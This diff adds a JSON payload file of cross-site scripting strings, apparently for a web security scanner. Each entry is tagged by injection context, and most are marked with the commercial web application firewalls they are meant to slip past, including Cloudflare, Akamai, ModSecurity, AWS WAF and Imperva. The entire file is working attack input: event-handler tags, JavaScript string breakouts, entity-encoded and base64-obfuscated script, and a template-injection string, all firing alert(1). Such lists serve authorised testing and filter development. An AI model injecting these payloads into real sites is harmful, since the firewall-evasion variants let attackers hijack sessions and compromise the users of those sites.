@@ -1,0 +1,241 @@
+{
+  "vulnerability_type": "XSS",
+  "description": "Cross-Site Scripting payloads with WAF bypass variants",
+  "payloads": [
+    {
+      "payload": "<script>alert(1)</script>",
+      "description": "Basic script tag",
+      "context": "html_body",
+      "waf_bypass": false,
+      "tags": ["basic", "script"]
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "description": "Image error event handler",
+      "context": "html_body",
+      "waf_bypass": false,
+      "tags": ["basic", "img", "event_handler"]
+    },
+    {
+      "payload": "<svg/onload=alert(1)>",
+      "description": "SVG onload without spaces",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity"],
+      "tags": ["svg", "event_handler", "waf_bypass", "no_space"]
+    },
+    {
+      "payload": "<svg onload=alert`1`>",
+      "description": "SVG onload with template literal",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai"],
+      "tags": ["svg", "template_literal", "waf_bypass"]
+    },
+    {
+      "payload": "<details open ontoggle=alert(1)>",
+      "description": "Details tag ontoggle event",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity", "aws_waf"],
+      "tags": ["details", "event_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"-->&lt;img src=x onerror=alert(1)&gt;\">",
+      "description": "Math/mtext namespace confusion",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai", "imperva"],
+      "tags": ["namespace_confusion", "advanced", "waf_bypass"]
+    },
+    {
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "description": "Input autofocus event",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity"],
+      "tags": ["input", "autofocus", "waf_bypass"]
+    },
+    {
+      "payload": "<body onload=alert(1)>",
+      "description": "Body onload event",
+      "context": "html_body",
+      "waf_bypass": false,
+      "tags": ["body", "event_handler"]
+    },
+    {
+      "payload": "<marquee onstart=alert(1)>",
+      "description": "Marquee onstart event",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity"],
+      "tags": ["marquee", "event_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<video><source onerror=alert(1)>",
+      "description": "Video source error event",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare"],
+      "tags": ["video", "event_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<isindex type=image src=1 onerror=alert(1)>",
+      "description": "Isindex tag with onerror",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity", "aws_waf"],
+      "tags": ["isindex", "legacy", "waf_bypass"]
+    },
+    {
+      "payload": "'-alert(1)-'",
+      "description": "JavaScript context breakout with subtraction",
+      "context": "js_string",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai"],
+      "tags": ["js_context", "string_breakout", "waf_bypass"]
+    },
+    {
+      "payload": "\\'-alert(1)//",
+      "description": "JavaScript escaped quote breakout",
+      "context": "js_string",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity"],
+      "tags": ["js_context", "escape_bypass", "waf_bypass"]
+    },
+    {
+      "payload": "\";alert(1)//",
+      "description": "JavaScript double quote breakout",
+      "context": "js_string",
+      "waf_bypass": false,
+      "tags": ["js_context", "string_breakout"]
+    },
+    {
+      "payload": "javascript:alert(1)",
+      "description": "JavaScript protocol handler",
+      "context": "href_attribute",
+      "waf_bypass": false,
+      "tags": ["protocol_handler", "href"]
+    },
+    {
+      "payload": "java%0ascript:alert(1)",
+      "description": "JavaScript protocol with newline bypass",
+      "context": "href_attribute",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity"],
+      "tags": ["protocol_handler", "newline_bypass", "waf_bypass"]
+    },
+    {
+      "payload": "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)",
+      "description": "JavaScript protocol with HTML hex entities",
+      "context": "href_attribute",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai", "modsecurity"],
+      "tags": ["html_entities", "protocol_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+      "description": "Iframe srcdoc injection",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "aws_waf"],
+      "tags": ["iframe", "srcdoc", "waf_bypass"]
+    },
+    {
+      "payload": "<object data=\"javascript:alert(1)\">",
+      "description": "Object tag with javascript protocol",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity"],
+      "tags": ["object", "protocol_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "description": "SVG animate onbegin event",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai", "imperva"],
+      "tags": ["svg", "animate", "event_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<a href=\"javascript&colon;alert(1)\">click</a>",
+      "description": "HTML entity colon bypass in javascript protocol",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity", "aws_waf"],
+      "tags": ["html_entities", "protocol_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<img src=x onerror=alert`1`>",
+      "description": "Template literal instead of parentheses",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "imperva"],
+      "tags": ["template_literal", "parentheses_bypass", "waf_bypass"]
+    },
+    {
+      "payload": "<svg><script>alert&#40;1&#41;</script>",
+      "description": "SVG script with HTML entity encoded parentheses",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity", "aws_waf"],
+      "tags": ["svg", "html_entities", "waf_bypass"]
+    },
+    {
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "description": "Angular template injection / prototype chain",
+      "context": "template_engine",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai"],
+      "tags": ["angular", "template", "prototype", "waf_bypass"]
+    },
+    {
+      "payload": "<script>window['ale'+'rt'](1)</script>",
+      "description": "String concatenation to avoid keyword detection",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity", "cloudflare"],
+      "tags": ["string_concat", "keyword_bypass", "waf_bypass"]
+    },
+    {
+      "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "description": "Base64 encoded payload via atob",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity", "aws_waf"],
+      "tags": ["base64", "encoding_bypass", "waf_bypass"]
+    },
+    {
+      "payload": "<img/src=x onerror=top[`al`+`ert`](1)>",
+      "description": "Slash instead of space + string concat via bracket notation",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "akamai", "imperva"],
+      "tags": ["no_space", "string_concat", "bracket_notation", "waf_bypass"]
+    },
+    {
+      "payload": "<svg><set onbegin=alert(1)>",
+      "description": "SVG set element onbegin",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["cloudflare", "modsecurity"],
+      "tags": ["svg", "set", "event_handler", "waf_bypass"]
+    },
+    {
+      "payload": "<x contenteditable onblur=alert(1)>lose focus</x>",
+      "description": "Custom element with contenteditable onblur",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["aws_waf", "modsecurity"],
+      "tags": ["custom_element", "contenteditable", "waf_bypass"]
+    },
+    {
+      "payload": "<%00script>alert(1)</script>",
+      "description": "Null byte before tag name",
+      "context": "html_body",
+      "waf_bypass": true,
+      "bypass_target": ["modsecurity", "f5_bigip"],
+      "tags": ["null_byte", "waf_bypass"]
+    }
+  ]
+}
